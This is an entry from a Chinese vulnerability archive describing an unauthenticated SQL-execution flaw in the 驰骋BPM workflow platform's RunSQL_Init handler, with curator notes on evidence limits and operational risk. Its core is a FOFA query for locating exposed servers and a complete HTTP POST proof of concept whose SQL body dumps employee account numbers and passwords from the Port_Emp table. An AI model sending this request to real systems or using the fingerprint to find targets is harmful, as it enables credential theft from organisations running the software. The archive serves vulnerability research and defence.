---
source: "wy876 漏洞文库"
title: "驰骋BPM RunSQL_Init SQL执行"
product: "驰骋BPM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "无Cookie请求但未明确"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lbie8f0kg63bbhee"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%A9%B0%E9%AA%8BBPM/%E9%A9%B0%E9%AA%8BBPMRunSQL_Init%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/WF/AppClassic/Home.htm\""
id: "vw-e16f919b4325e7cd75c46ab7"
entity_id: "ve-e16f919b4325e7cd75c46ab7"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 驰骋BPM RunSQL_Init SQL执行

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：驰骋BPM；RunSQL_Init SQL执行
- 版本、配置及部署条件：无版本
- 认证与权限前提：无Cookie请求但未明确
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA截断，Accept-Ldwk宣传头可删，Host字段为空
- 有原语雀链接但无响应/根因/修复；直接读账号密码不属无害验证

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
驰骋BPM是一款功能强大的业务流程管理平台，可提供可视化的设计界面和灵活的流程配置，帮助企业轻松构建、管理和优化各类业务流程。驰骋BPM RunSQL_Init存在SQL注入漏洞，攻击者可通过该漏洞获取账号密码。

## 二、影响版本
+ 驰骋BPM

## 三、资产测绘
+ fofa`body="/WF/AppClassic/Home.htm"`
+ 特征


## 四、漏洞复现
```http
POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 160
Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

------123128312312389898yd98ays98d
Content-Disposition: form-data; name="SQL"

SELECT No,Pass FROM Port_Emp
------123128312312389898yd98ays98d--
```

> 请求长度说明：原资料 Content-Length 为 160；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lbie8f0kg63bbhee>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
